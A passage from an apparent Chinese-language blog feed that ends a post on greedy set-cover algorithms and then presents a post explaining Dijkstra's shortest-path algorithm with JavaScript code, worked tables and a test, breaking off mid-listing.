遍历radioStation，将每一项与addressCollection进行交集</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> radioStation) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = radioStation[key];</span><br><span class="line">    <span class="keyword">let</span> intersection = <span class="keyword">new</span> <span class="title class_">Set</span>(address.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> <span class="keyword">new</span> <span class="title class_">Set</span>(element).<span class="title function_">has</span>(i))); <span class="comment">//取交集</span></span><br><span class="line">    <span class="comment">// 判断：若当前集合大于之前的集合，则重新赋值最大值</span></span><br><span class="line">    intersection.<span class="property">size</span> &gt; maxAddressStation.<span class="property">size</span> &amp;&amp; ((maxAddressStation = intersection), (station = key));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (maxAddressStation.<span class="property">size</span> == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&#x27;所选数据无解&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">push</span>(station); <span class="comment">//将广播站压入</span></span><br><span class="line">  address = address.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> !maxAddressStation.<span class="title function_">has</span>(i)); <span class="comment">//取差集，即剩下需要广播的地址</span></span><br><span class="line">  <span class="keyword">delete</span> radioStation[station]; <span class="comment">//排除当前已选择的广播站</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">greedy</span>(address, radioStation, res); <span class="comment">//继续下次递归</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>贪婪算法寻找局部最优解，企图以这种方式获得全局最优解。 </li><li>对于NP完全问题，还没有找到快速解决方案。 </li><li>面临NP完全问题时，最佳的做法是使用近似算法。 </li><li>贪婪算法易于实现、运行速度快，是不错的近似算法。</li></ol><h3 id="练习答案"><a href="#练习答案" class="headerlink" title="练习答案"></a>练习答案</h3><p>三个都是NP问题，快去用贪婪算法试着解出来吧！加油💪</p>]]></content>
    
    <summary type="html">
    
      贪心算法（又称贪婪算法）是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，算法得到的是在某种意义上的局部最优解
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>狄克斯特拉算法</title>
    <link href="http://dong-666.github.io/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/"/>
    <id>http://dong-666.github.io/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/</id>
    <published>2021-10-06T14:00:00.000Z</published>
    <updated>2022-03-02T07:59:40.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>迪杰斯特拉算法主要特点是从起始点开始，采用<a href="https://baike.baidu.com/item/贪心算法/5411800">贪心算法</a>的策略，每次遍历到始点距离最近且未访问过的顶点的邻接节点，直到扩展到终点为止</p></blockquote><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>假设给定一个二维数组，里面存储着各个相邻点之间的距离，</p><p>比如第一个<code>[&#39;a&#39;, &#39;b&#39;, 20]</code>，表示着从A点到B点的距离为20，以此类推</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = [</span><br><span class="line">  [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">20</span>],</span><br><span class="line">  [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="number">20</span>],</span><br><span class="line">  [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>],</span><br><span class="line">  [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">20</span>],</span><br><span class="line">  [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="number">5</span>],</span><br><span class="line">  [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>],</span><br><span class="line">  [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="number">6</span>],</span><br><span class="line">  [<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">20</span>],</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>而我们的需求则是，以某个确定的点为起点，得出其到其余点的最短距离，比如以a为起点，我们想得到其到b、c、d、e的最短距离</p><p>那么这个算法该如何在js上实现</p><p>单纯从这个数组来看，好像有点想不出解法，我们先试着把它转化成图形关系，从而更加容易理解点</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/image-20220218093850197.png" alt="image-20220218093850197"></p><p>从这个图，我们可以更加直观的理解每个点之间的位置距离关系，比如A，可以直接到达B、C、E，但却不能直接到达D，要想过去，还得通过一些“中介点”</p><p>接着，我们来简略介绍下狄克斯特拉算法的使用步骤</p><blockquote><p>(1) 找出“最便宜”的节点，即可在最短时间内到达的节点。 </p><p>(2) 更新该节点的邻居的开销。</p><p>(3) 重复这个过程，直到对图中的每个节点都这样做了。</p><p> (4) 计算最终路径。</p></blockquote><p>在默认初始化条件下：我们用一个表来记录默认起点下到其他点的最短距离</p><table><thead><tr><th>次数</th><th>S</th><th>b</th><th>c</th><th>d</th><th>e</th></tr></thead><tbody><tr><td>1</td><td>{a}</td><td>20</td><td>3</td><td>∞</td><td>20</td></tr><tr><td>2</td><td>{a,c}</td><td>20</td><td>3</td><td>8</td><td>20</td></tr><tr><td>3</td><td>{a,c,b}</td><td>20</td><td>3</td><td>8</td><td>20</td></tr><tr><td>4</td><td>{a,c,b,d}</td><td>20</td><td>3</td><td>8</td><td>14</td></tr></tbody></table><p>用一个表格记录更新完最短距离表格后的目标地点的上一个节点</p><table><thead><tr><th>次数</th><th>b</th><th>c</th><th>d</th><th>e</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>a</td><td>a</td><td>a</td></tr><tr><td>2</td><td>a</td><td>a</td><td>c</td><td>a</td></tr><tr><td>3</td><td>a</td><td>a</td><td>c</td><td>a</td></tr><tr><td>4</td><td>a</td><td>a</td><td>c</td><td>d</td></tr></tbody></table><p>阐述下这个过程</p><p>首先，我们将A到各个其他点的距离记录进去，接着按<strong>初始距离从短到长</strong>的顺序将a,b、a,c、a,d这三个当作一个整体去更新表格(注意：这里不是简单的就是a→b，而是他们之间的最短路径)</p><p>记住，每次我们都从最短的路径入手，比如a到c的距离最短，那么我们就从该点c入手，其次就是在b和d中选择</p><p>比如在接下来，我们把a→c当作一个整体，它的默认权重为3，然后去对比其他各个点，注意看图，根据结果去刷新最短距离，比如c到e的距离是30，加上默认权重（a→c）3，是33，比a直接到达e还远，所以我们不更新该距离，以及c的最短距离的上一个节点还是a，其他类似，每一步更新完，即可得出起点到达该点的最短距离了</p><p>我们重点看下第三次和第四次，在第三次，a到b，c还是不变，但是c可以直接到d了,也就是说，在原先的基础a到c的距离3上加5，得出该距离为8，同时途径点可以更新为c</p><p>第四次，我们发现d到e的距离为6，加上a到d的最短距离8可以达到14，比a直接过去还短，所以我们更新表格，最短距离为14，上个节点为e</p><p>我们可以看到这样的规律，如果当前节点pass到终点end的距离(passEnd)加上起点start到当前节点pass的距离(startPass)小于默认起点start到终点end的距离(startEnd)，那么就更新表格</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果startPass + passEnd &lt; startEnd</span><br><span class="line">则startEnd = startPass + passEnd（更新）</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><ol><li>我们用一个对象来存储当个点到其他点的距离，比如下面</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  b<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    instance<span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span></span><br><span class="line">    process<span class="punctuation">:</span> a</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  c<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    instance<span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">    process<span class="punctuation">:</span> a</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>用一个函数来格式化该操作，data为数组数据，startPoint为起点，targetPoint为终点集合（数组），格式完数据后，我们把起点到起点的数据删掉，因为该点并没有什么用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化单个数据的散列表</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">data, startPoint, targetPoint</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 初始化每条数据，默认距离为无穷大，上一节点为起始点startPoint</span></span><br><span class="line">  targetPoint.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">      res[i] = &#123;</span><br><span class="line">        <span class="attr">instance</span>: <span class="number">99999</span>,</span><br><span class="line">        <span class="attr">process</span>: startPoint,</span><br><span class="line">        <span class="attr">target</span>: i</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 遍历数据，赋值已有最近临点初始距离</span></span><br><span class="line">  data.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (res[i[<span class="number">1</span>]] &amp;&amp; i[<span class="number">0</span>] == startPoint) &#123;</span><br><span class="line">      res[i[<span class="number">1</span>]].<span class="property">instance</span> = i[<span class="number">2</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  res[startPoint] &amp;&amp; <span class="keyword">delete</span> res[startPoint] <span class="comment">//删除起点（无用）</span></span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>接着，我们用另一个对象把所有数据包裹起来，</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   起点<span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">     目标地点<span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       instance<span class="punctuation">:</span> 距离<span class="punctuation">,</span></span><br><span class="line">       process<span class="punctuation">:</span> <span class="punctuation">[</span>途径地点<span class="punctuation">]</span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     目标地点<span class="number">2</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">       instance<span class="punctuation">:</span> 距离<span class="punctuation">,</span></span><br><span class="line">       process<span class="punctuation">:</span> <span class="punctuation">[</span>途径地点<span class="punctuation">]</span></span><br><span class="line">     <span class="punctuation">&#125;</span></span><br><span class="line">...</span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   起点<span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">     目标地点<span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       instance<span class="punctuation">:</span> 距离<span class="punctuation">,</span></span><br><span class="line">       process<span class="punctuation">:</span> <span class="punctuation">[</span>途径地点<span class="punctuation">]</span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     目标地点<span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       instance<span class="punctuation">:</span> 距离<span class="punctuation">,</span></span><br><span class="line">       process<span class="punctuation">:</span> <span class="punctuation">[</span>途径地点<span class="punctuation">]</span></span><br><span class="line">     <span class="punctuation">&#125;</span>...</span><br><span class="line">   <span class="punctuation">&#125;</span> </span><br><span class="line"> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>实现该操作的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立全部数据的散列表</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pointDistanceHashTable</span>(<span class="params">data, targetPoint</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 对所有点进行遍历并初始化</span></span><br><span class="line">  targetPoint.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i, index</span>) =&gt;</span> &#123;</span><br><span class="line">    res[i] = <span class="title function_">init</span>(data, i, targetPoint)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>对比长度的函数，通过前面的介绍我们可以知道这个过程的实现，无需多言，直接看代码，入参含义为（数组数据，起点名称，当前点名称，终点名称）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对比两者距离长度，会改变data，返回最新结果</span></span><br><span class="line"><span class="comment">// 参数：数据initData, 起点名称，当前点名称，终点名称</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">longer</span>(<span class="params">initData, start, pass, end</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> newDistance = initData[start][pass].<span class="property">instance</span> + initData[pass][end].<span class="property">instance</span></span><br><span class="line">  <span class="keyword">if</span> (newDistance &lt; initData[start][end].<span class="property">instance</span>) &#123;</span><br><span class="line">    initData[start][end].<span class="property">instance</span> = newDistance</span><br><span class="line">    initData[start][end].<span class="property">process</span> = pass</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> initData[start]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>按距离从小到大进行排序，传入对象（数组），返回数组，会改变原数据</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sortData</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(data <span class="keyword">instanceof</span> <span class="title class_">Array</span>)) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = []</span><br><span class="line">    <span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123;</span><br><span class="line">      arr.<span class="title function_">push</span>(data[key])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> a.<span class="property">instance</span> - b.<span class="property">instance</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="property">instance</span> - b.<span class="property">instance</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>主函数入口：最主要的就是迭代，对每个点进行迭代执行analyse函数，再对每个点下的终点距离进行遍历判断</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dijkstra</span>(<span class="params">data, startPoint, targetPoint</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> allPoint = <span class="keyword">new</span> <span class="title class_">Set</span>([...targetPoint, startPoint])</span><br><span class="line">    <span class="comment">// 获取全部点的散列表</span></span><br><span class="line">  <span class="keyword">let</span> initData = <span class="title function_">pointDistanceHashTable</span>(data, allPoint);</span><br><span class="line">  <span class="comment">// 将起点单独提取出来，用于遍历, 大小比较</span></span><br><span class="line">  <span class="keyword">let</span> startPointData = initData[startPoint];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按初始路径长短顺序进行路径分析</span></span><br><span class="line">  <span class="keyword">return</span> (analyse = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (startPointData.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      initData[startPoint].<span class="property">start</span> = startPoint <span class="comment">//给他一个名字</span></span><br><span class="line">      <span class="keyword">return</span> initData[startPoint]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      startPointData = <span class="title function_">sortData</span>(startPointData) <span class="comment">//排序</span></span><br><span class="line">      <span class="comment">// 遍历更新数据</span></span><br><span class="line">      <span class="keyword">for</span> (next <span class="keyword">in</span> initData[startPointData[<span class="number">0</span>].<span class="property">target</span>]) &#123;</span><br><span class="line">        <span class="comment">// 排除掉绕圈</span></span><br><span class="line">        <span class="keyword">if</span> (next != startPoint) &#123;</span><br><span class="line">          <span class="comment">// 更新掉initData的数据</span></span><br><span class="line">          <span class="title function_">longer</span>(initData, startPoint, startPointData[<span class="number">0</span>].<span class="property">target</span>, next)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      startPointData.<span class="title function_">shift</span>() <span class="comment">//移除当前数据</span></span><br><span class="line">      <span class="comment">// 继续迭代</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">analyse</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>将结果进行描述的函数，在这里对于算法来说没啥用处，主要就是结果的文字展示</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 途径函数，传入算法计算结果的数据，以及要到达的终点，返回文字提示</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">roadPoint</span>(<span class="params">data, end</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!data[end]) <span class="keyword">return</span> <span class="string">&#x27;无到达该点的最短距离数据&#x27;</span></span><br><span class="line">  <span class="keyword">let</span> pass = [end]</span><br><span class="line">  <span class="keyword">let</span> instanceText = <span class="string">&#x27;从&#x27;</span> + data.<span class="property">start</span> + <span class="string">&#x27;到&#x27;</span> + end + <span class="string">&#x27;的距离为&#x27;</span> + data[end].<span class="property">instance</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 迭代</span></span><br><span class="line">  <span class="keyword">return</span> (get = <span class="keyword">function</span>(<span class="params">end</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[end].<span class="property">process</span> == data.<span class="property">start</span>) &#123;</span><br><span class="line">      pass.<span class="title function_">unshift</span>(data.<span class="property">start</span>)</span><br><span class="line">      <span class="keyword">return</span> instanceText + <span class="string">&#x27;,完整路径为&#x27;</span> + pass</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pass.<span class="title function_">unshift</span>(data[end].<span class="property">process</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">get</span>(data[end].<span class="property">process</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)(end)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>拿前面的数据进行测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res1 = <span class="title function_">dijkstra</span>(data, <span class="string">&#x27;a&#x27;</span>, [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res1)</span><br><span class="line"><span class="keyword">let</span> res1Text = <span class="title function_">roadPoint</span>(res1, <span class="string">&#x27;e&#x27;</span>) <span class="comment">//文字描述</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res1Text);</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/image-20220219164513219.png" alt="image-20220219164513219"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化单个数据的散列表</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">data, startPoint, targetPoint</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 初始化每条数据，默认距离为无穷大，上一节点为起始点startPoint</span></span><br><span class="line">  targetPoint.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">      res[i] = &#123;</span><br><span class="line">        <span class="attr">instance</span>: <span class="number">99999</span>,</span><br><span class="line">        <span class="attr">process</span>: startPoint,</span><br><span class="line">        <span class="attr">target</span>: i</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 遍历数据，赋值已有最近临点初始距离</span></span><br><span class="line">  data.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (res[i[<span class="number">1</span>]] &amp;&amp; i[<span class="number">0</span>] == startPoint) &#123;</span><br><span class="line">      res[i[<span class="number">1</span>]].<span class="property">instance</span> = i[<span class="number">2</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  res[startPoint] &amp;&amp; <span class="keyword">delete</span> res[startPoint] <span class="comment">//删除起点（无用）</span></span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立全部数据的散列表</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pointDistanceHashTable</span>(<span class="params">data, targetPoint</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 对所有点进行遍历并初始化</span></span><br><span class="line">  targetPoint.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i, index</span>) =&gt;</span> &#123;</span><br><span class="line">    res[i] = <span class="title function_">init</span>(data, i, targetPoint)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对比两者距离长度，会改变data，返回最新结果</span></span><br><span class="line"><span class="comment">// 参数：数据initData, 起点名称，当前点名称，终点名称</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">longer</span>(<span class="params">initData, start, pass, end</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> newDistance = initData[start][pass].<span class="property">instance</span> + initData[pass][end].<span class="property">instance</span></span><br><span class="line">  <span class="keyword">if</span> (newDistance &lt; initData[start][end].<span class="property">instance</span>) &#123;</span><br><span class="line">    initData[start][end].<span class="property">instance</span> = newDistance</span><br><span class="line">    initData[start][end].<span class="property">process</span> = 